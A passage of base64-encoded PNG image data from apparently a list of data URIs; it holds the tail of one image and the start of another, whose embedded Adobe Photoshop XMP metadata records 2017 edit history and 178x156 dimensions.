gICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCjw/eHBhY2tldCBlbmQ9InciPz4uB7INAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAElBMVEX///////////////////////+65XQCAAAABXRSTlPu/vT23qJ2fH8AAACzSURBVHja7dQxEQAgDASwPzywVwQOUMCAfyuY6EYiItkZ8wLfOZUVAYAAAAEAAgAEAAgAEAAgAEAAgAAAAQACAAQACAAQACAAQACAAAABAAIABAAIABAAIABAAIAAAAEAAgAEAAgAEAAgAEAAgAAAAQACAAQAAhAACAAQACAAQACAAAABAAIABAAIABAAIABAAIAAAAEAAgAEAAgAEAAgAEAAgAAAAQACAAQACAAQANAQwAP/Re0T5DMNRQAAAABJRU5ErkJggg==", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALIAAACcCAMAAADs8gEcAAA7cmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzIgNzkuMTU5Mjg0LCAyMDE2LzA0LzE5LTEzOjEzOjQwICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgICAgICAgICAgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiCiAgICAgICAgICAgIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiCiAgICAgICAgICAgIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDo4NzZiZmI1ZC01YjljLTRlNzYtYTI3Yy1hYTBiMTgzYjA5OTc8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDoyMkRFOTRGQURBQkYxMUU2QjJBM0FCMTdFMkVERjQ2NjwveG1wTU06RG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkluc3RhbmNlSUQ+eG1wLmlpZDpkODgxNmM2My1hNGZkLTRiZjEtODg3Yy1kYTYzMGExYzM2MzA8L3htcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4bXBNTTpEZXJpdmVkRnJvbSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgIDxzdFJlZjppbnN0YW5jZUlEPnhtcC5paWQ6NzEzMWY5YWQtNTQyYS00MzNiLWE3MDctMDE2ZGE0NmI4MDM2PC9zdFJlZjppbnN0YW5jZUlEPgogICAgICAgICAgICA8c3RSZWY6ZG9jdW1lbnRJRD54bXAuZGlkOjg3NmJmYjVkLTViOWMtNGU3Ni1hMjdjLWFhMGIxODNiMDk5Nzwvc3RSZWY6ZG9jdW1lbnRJRD4KICAgICAgICAgPC94bXBNTTpEZXJpdmVkRnJvbT4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOjEzZWExOGExLTMzZWItNDUxNy04OTk1LWQ2YmJlMDllYjBmNzwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNy0wMi0wOVQxMjowNzoxMCswMTowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6ZDg4MTZjNjMtYTRmZC00YmYxLTg4N2MtZGE2MzBhMWMzNjMwPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE3LTAyLTA5VDEyOjEzOjQ3KzAxOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICAgICA8c3RFdnQ6Y2hhbmdlZD4vPC9zdEV2dDpjaGFuZ2VkPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoTWFjaW50b3NoKTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wOkNyZWF0ZURhdGU+MjAxNy0wMS0yNVQwMjowODozNCswMTowMDwveG1wOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4yMDE3LTAyLTA5VDEyOjEzOjQ3KzAxOjAwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAxNy0wMi0wOVQxMjoxMzo0NyswMTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPGRjOmZvcm1hdD5pbWFnZS9wbmc8L2RjOmZvcm1hdD4KICAgICAgICAgPHBob3Rvc2hvcDpDb2xvck1vZGU+MzwvcGhvdG9zaG9wOkNvbG9yTW9kZT4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgICAgPHRpZmY6WFJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOlhSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpZUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WVJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDxleGlmOkNvbG9yU3BhY2U+NjU1MzU8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjE3ODwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4xNTY8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC